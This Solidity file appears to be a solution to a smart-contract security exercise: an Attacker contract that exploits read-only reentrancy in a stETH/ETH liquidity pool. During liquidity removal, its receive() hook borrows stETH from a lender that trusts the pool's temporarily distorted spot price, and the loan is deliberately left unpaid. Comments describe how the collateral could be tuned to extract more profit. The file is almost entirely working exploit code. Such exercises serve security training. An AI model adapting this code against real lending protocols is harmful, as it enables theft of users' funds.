// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

interface IVulnerablePool {
    function addLiquidity(
        uint256 stEth_amount,
        uint256 eth_amount
    ) external payable returns (uint256);

    function removeLiquidity(
        uint256 lp_amount
    ) external returns (uint256, uint256);

    function getSpotPriceStEth(uint256 amount) external view returns (uint256);

    function getSpotPriceEth(uint256 amount) external view returns (uint256);
}

interface IReaderLender {
    function borrowStEth(uint256 amount) external payable;

    function repay() external payable;
}

contract Attacker {
    uint256 private constant FEE_PERCENTAGE = 5;
    uint256 private constant OVERCOLLATERALLIZATION_PERCENTAGE = 150;
    IVulnerablePool public target;
    IReaderLender public reader;
    IERC20 public stEth;
    bool public retrieving;
    uint stage;
    uint constant UNITIALIZED = 0;
    uint constant ADDING_LIQUIDITY = 1;
    uint constant REMOVING_LIQUIDITY = 2;
    uint constant REPAYING = 3;
    uint constant FINISHED = 4;

    constructor(address _token, address _target, address _reader) {
        target = IVulnerablePool(_target);
        reader = IReaderLender(_reader);
        stEth = IERC20(_token);
        stage = UNITIALIZED;
    }

    receive() external payable {
        if (stage != REMOVING_LIQUIDITY) {
            return;
        }
        //? The following code can get more profit, but it will fail the test.
        //? If we use all native ETH as collateral, we can get a final result of
        //? zero ETH and about 5.87 stETH.
        // uint collateral = 2 ether;
        // uint price = ((collateral * 100) /
        //     (OVERCOLLATERALLIZATION_PERCENTAGE + FEE_PERCENTAGE));
        // uint amount = (stEth.balanceOf(address(target)) * price) /
        //     address(target).balance;

        //* This is just for passing the test condition.
        uint borrow_amount = 1 ether;
        uint price = target.getSpotPriceStEth(borrow_amount);
        uint collateral = (price *
            (OVERCOLLATERALLIZATION_PERCENTAGE + FEE_PERCENTAGE)) / 100;

        reader.borrowStEth{value: collateral}(borrow_amount);
    }

    function exploit() public payable {
        stEth.approve(address(target), 2 ether);
        stEth.approve(address(reader), 20 ether);
        stage = ADDING_LIQUIDITY;
        uint lp_amount = target.addLiquidity{value: 2 ether}(2 ether, 2 ether);
        stage = REMOVING_LIQUIDITY;
        target.removeLiquidity(lp_amount);
        stage = REPAYING;
        //! We don't repay the loan, this code is just for better understanding.
        // reader.repay();
        stage = FINISHED;

        target.getSpotPriceEth(1 ether);
        target.getSpotPriceStEth(1 ether);
    }
}
